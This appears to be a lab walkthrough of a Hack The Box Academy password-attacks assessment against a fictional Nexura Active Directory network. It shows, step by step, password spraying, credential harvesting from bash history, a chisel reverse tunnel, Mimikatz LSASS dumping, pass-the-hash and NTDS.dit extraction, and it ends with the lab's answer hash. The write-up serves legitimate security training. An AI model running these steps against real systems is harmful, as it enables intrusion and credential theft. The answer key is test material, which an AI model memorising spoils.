---
created: 2026-09-06
updated: 2026-09-20
---

| Host     | IP Address                                                        |
| -------- | ----------------------------------------------------------------- |
| `DMZ01`  | `10.129.102.73` **(External)**<br>`172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                                    |
| `FILE01` | `172.16.119.10`                                                   |
| `DC01`   | `172.16.119.11`                                                   |
## `DMZ01`

### Getting a foothold

- Given: `Betty Jayde` works at `Nexura LLC`; she uses the password `Texas123!@#` of multiple websites, and might be reusing it at work.

- Generate a list of possible usernames for `Betty` using `username-anarchy`:

```bash
python3 ./username-anarchy Betty Jayde > betty_usernames.txt
```

- Then scan `DMZ01`:

```bash
sudo nmap -sV 10.129.102.73
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-08 13:05 EDT
Nmap scan report for 10.129.102.73
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds
```

- Use `hydra` with the generated list of usernames and `Texas123!@#` for SSH:

```bash
hydra -L betty_usernames.txt -P 'Texas123!@#' ssh://10.129.102.73
```

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-08 13:25:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task
[DATA] attacking ssh://10.129.102.73:22/
[22][ssh] host: 10.129.102.73   login: jbetty   password: Texas123!@#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-08 13:26:13
```

- Authenticate as `jbetty`:

```bash
ssh jbetty@10.129.102.73
```

### Hunting for credentials

- List home directory:

```bash
jbetty@DMZ01:~$ ls -la
```

```bash
total 32
drwxr-xr-x 4 jbetty jbetty 4096 Jun  2  2025 .
drwxr-xr-x 4 root   root   4096 May 30  2025 ..
-rw-r--r-- 1 jbetty jbetty 2139 Jun  2  2025 .bash_history
-rw-r--r-- 1 jbetty jbetty  220 Apr 29  2025 .bash_logout
-rw-r--r-- 1 jbetty jbetty 3771 Apr 29  2025 .bashrc
drwx------ 2 jbetty jbetty 4096 May 30  2025 .cache
drwxrwxr-x 3 jbetty jbetty 4096 May 30  2025 .local
-rw-r--r-- 1 jbetty jbetty  807 Apr 29  2025 .profile
```

- Inspect Bash history:

```bash
jbetty@DMZ01:~$ cat .bash_history
```

```bash
# ...
free -m
top
htop
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
sudo systemctl status apache2
sudo systemctl restart apache2
cd /etc/nginx/sites-available
ls
cat default
sudo nano default
sudo nginx -t
sudo systemctl reload nginx
cd ~
mkdir scripts
cd scripts
vim backup.sh
chmod +x backup.sh
./backup.sh
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
logout
# ...
```

- Credentials found:

```bash
hwilliam
dealer-screwed-gym1
```


- Credentials table:

| Username   | Password              |
| ---------- | --------------------- |
| `hwilliam` | `dealer-screwed-gym1` |

### Establishing `chisel` tunnel

1. Transfer `chisel` binary to the target:

```bash
scp ./chisel jbetty@10.129.102.73:/home/jbetty
```

2. On your attacker machine:

```bash
chisel server --reverse --port 9050
```

3. On the pivot:

```bash
chmod +x chisel
```
```bash
chisel client 10.10.15.40:9050 R:socks
```


- Trying credentials across the machines:

```bash
evil-winrm -i 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
```
### Scanning ports

- TCP connect scan on common Windows ports:
- `JUMP01`:

```bash
proxychains nmap -p 3389,5985,445,135 --min-rate=10000 -Pn -sT 172.16.119.7
```

```bash
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 05:33 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:135-<--timeout
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:3389-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:445-<--timeout
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.119.7
Host is up (12s latency).

PORT     STATE  SERVICE
135/tcp  closed msrpc
445/tcp  closed microsoft-ds
3389/tcp open   ms-wbt-server
5985/tcp open   wsman

Nmap done: 1 IP address (1 host up) scanned in 31.99 seconds
```

- `FILE01`:

```bash
proxychains nmap -p 3389,5985,445,135 --min-rate=10000 -Pn -sT 172.16.119.10
```

```bash
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 05:34 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:3389-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:5985-<><>-OK
Nmap scan report for 172.16.119.10
Host is up (0.57s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```

- Connecting to `JUMP01` vi WinRM using the discovered credentials:

```bash
proxychains evil-winrm -i 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
*Evil-WinRM* PS C:\Users\hwilliam\Documents> 
```

- The connection succeeds, but there's nothing interesting on the host.

### SMB `FILE01`

- However, you can connect to `FILE01` via SMB using the same credentials:

```bash
proxychains smbclient -L //172.16.119.10 -U 'nexura\hwilliam'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:445-<><>-OK
Password for [NEXURA\hwilliam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	HR              Disk      
	IPC$            IPC       Remote IPC
	IT              Disk      
	MANAGEMENT      Disk      
	PRIVATE         Disk      
	TRANSFER        Disk      
Reconnecting with SMB1 for workgroup listing.
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:139-
```

- Checking access using `smbmap`:

```bash
proxychains smbmap -u 'hwilliam' -p 'dealer-screwed-gym1' -d nexura -H 172.16.119.10
ProxyChains-3.1 (http://proxychains.sf.net)
# ...
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 172.16.119.10:445	Name: 172.16.119.10       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	HR                                                	READ, WRITE	
	IPC$                                              	NO ACCESS	Remote IPC
	IT                                                	NO ACCESS	
	MANAGEMENT                                        	NO ACCESS	
	PRIVATE                                           	NO ACCESS	
	TRANSFER                                          	NO ACCESS	
[*] Closed 1 connections 
```

- Connect to the `HR` share:

```bash
proxychains smbclient //172.16.119.10/HR -U 'nexura\hwilliam'
````
```bash
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:445-<><>-OK
Password for [NEXURA\hwilliam]:
Try "help" to get a list of possible commands.
```

- List content:

```bash
smb: \> ls
```
```bash
  .                                   D        0  Wed Sep  9 05:55:54 2026
  ..                                  D        0  Wed Sep  9 05:55:54 2026
  2024                                D        0  Tue Apr 29 12:08:16 2025
  2025                                D        0  Tue Apr 29 12:07:24 2025
  Archive                             D        0  Tue Apr 29 12:10:24 2025

		5056511 blocks of size 4096. 1580237 blocks available
```

- In the `Archive` folder, find `Employee-Passwords_OLD.psafe3` and get it.

```bash
proxychains smbclient //172.16.119.10/HR -U 'nexura\hwilliam' -c 'cd Archive ; get Employee-Passwords_OLD.psafe3'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.10:445-<><>-OK
Password for [NEXURA\hwilliam]:
getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080 as Employee-Passwords_OLD.psafe3 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
```

### Cracking `psafe`

- The `psafe3` file is password-protected. Extract a hash from it to crack with JohnTheRipper:

```bash
pwsafe2john Employee-Passwords_OLD.psafe3
```

```bash
Employee-Passwords_OLD:$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978
```

- Save this hash to a file and use `rockyou.txt` to crack it:

```bash
john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwhash.txt
```

- Recovered credentials:

| Username   | Password                |
| ---------- | ----------------------- |
| `jbetty`   | `xiao-nicer-wheels5`    |
| `bdavid`   | `caramel-cigars-reply1` |
| `stom`     | `fails-nibble-disturb4` |
| `hwilliam` | `warned-wobble-occur8`  |

### `JUMP01`

- Use `bdavid` to connect to `JUMP01`:

```bash
proxychains evil-winrm -i 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'
```

```bash
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
*Evil-WinRM* PS C:\Users\bdavid\Documents> 
```

- `bdavid` turns out to be an administrator:

```bash
Evil-WinRM* PS C:\Users\bdavid\Documents> whoami /all
```

```bash
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK

USER INFORMATION
----------------

User Name     SID
============= =============================================
nexura\bdavid S-1-5-21-1333759777-277832620-2286231135-1105


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                           Attributes
==================================== ================ ============================================= ===============================================================
Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NEXURA\IT                            Group            S-1-5-21-1333759777-277832620-2286231135-1111 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- And since `bdavid` has `SeDebugPrivilege`, you can use Mimikatz to dump LSASS memory from `JUMP01`.

### Extracting credentials using Mimikatx

- First, find Mimikatz on your Pwnbox:

```bash
sudo find / -name "*mimikatz.exe*"
```

```bash
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

- Then upload using `Evil-WinRM`:

```bash
upload mimikatz.exe
```

```bash
*Evil-WinRM* PS C:\Temp> upload mimikatz.exe
                                        
Info: Uploading /home/user/HTB/Academy/password_attacks/mimikatz.exe to C:\Temp\mimikatz.exe
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.119.7:5985-<><>-OK
                                        
Data: 1807016 bytes of 1807016 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp>
```

- Interactive mode might not work properly, so run as a command:

```bash
.\mimikatz.exe "privilege::debug sekurlsa::logonPasswords" exit
```

- From the dump, find `stom`'s hash and connect to the DC:

```bash
proxychains evil-winrm -i 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa
```

- And `stop` is a domain admin:

```bash
*Evil-WinRM* PS C:\Users\stom\Documents> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== =============================================
nexura\stom S-1-5-21-1333759777-277832620-2286231135-1106


GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\stom\Documents> 
```

- Create a shadow disk copy and net `NTDS.dit`:

```bash
vssadmin CREATE SHADOW /For=C:
```

```bash
mkdir C:\NTDS  
```


```bash
cd C:\NTDS  
```

```bash
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit  
```

```bash
download NTDS.dit
```

- Then copy and download `HKLM\system`:

```bash
*Evil-WinRM* PS C:\Users\stom\Documents> reg.exe save hklm\system C:\Temp\system.save
The operation completed successfully.
```

```bash
*Evil-WinRM* PS C:\Users\stom\Documents> download C:\Temp\system.save
```

- Then extract secrets using Impacket:

```bash
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

```bash
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:39c8947fa5386251cf0d59b5cf642d37:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::
nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa:::
nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::
FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::
JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321:::
[*] Kerberos keys from NTDS.dit 
Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
Administrator:des-cbc-md5:5ec10792619bfb6e
DC01$:aes256-cts-hmac-sha1-96:1225eb0232d4f0b7c9d34d8062a9e17ae7b5776cc9d2705440d227fe74cb0e2e
DC01$:aes128-cts-hmac-sha1-96:8aa4605d4e57abc007eef9ab97b0a713
DC01$:des-cbc-md5:d92558fd081c0e83
krbtgt:aes256-cts-hmac-sha1-96:69e5591bfd4ca06737b9e29da1dc77611b1e33af7537bccbef3040c5d2ddc09f
krbtgt:aes128-cts-hmac-sha1-96:9ffbdd5ba3b47488803901aa70b331ee
krbtgt:des-cbc-md5:587c384a7a793e6d
nexura.htb\bdavid:aes256-cts-hmac-sha1-96:f7f6449b2788bf507230a6f6e79c5accf17b060dc7d50e2446d91397f8092dee
nexura.htb\bdavid:aes128-cts-hmac-sha1-96:921921f196fc51d33e9fb279345fb351
nexura.htb\bdavid:des-cbc-md5:520eb6dc0d51409d
nexura.htb\stom:aes256-cts-hmac-sha1-96:63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
nexura.htb\stom:aes128-cts-hmac-sha1-96:c61d601cb033f183e25a135d3a396cad
nexura.htb\stom:des-cbc-md5:2f8f46c2fe49e6fe
nexura.htb\hwilliam:aes256-cts-hmac-sha1-96:6f098c0966f8a46698cd2d3b258856b26811bbd120dd0c6b6b62156035e4ebe9
nexura.htb\hwilliam:aes128-cts-hmac-sha1-96:2fb4de7ead6bc5f5e278596ba7f29be1
nexura.htb\hwilliam:des-cbc-md5:c1676b54e061c7ae
FILE01$:aes256-cts-hmac-sha1-96:ffaf60d490100bff3aa2becad0c14f6cbdc5316cebc62ecf1884fbd3218cb938
FILE01$:aes128-cts-hmac-sha1-96:f6f29e95a1e17053eb0b88a25d373bf9
FILE01$:des-cbc-md5:d6a1c72358e50bb6
JUMP01$:aes256-cts-hmac-sha1-96:9521aa66829ccb2e8263c0fd7ac25e909bba456a1474ecac6676ace5ce7a812b
JUMP01$:aes128-cts-hmac-sha1-96:37d4bc9e0e866864ab16a4d5d70f4b70
JUMP01$:des-cbc-md5:a715e9eaf761b083
[*] Cleaning up... 
```

- Answer:

```bash
36e09e1e6ade94d63fbcab5e5b8d6d23
```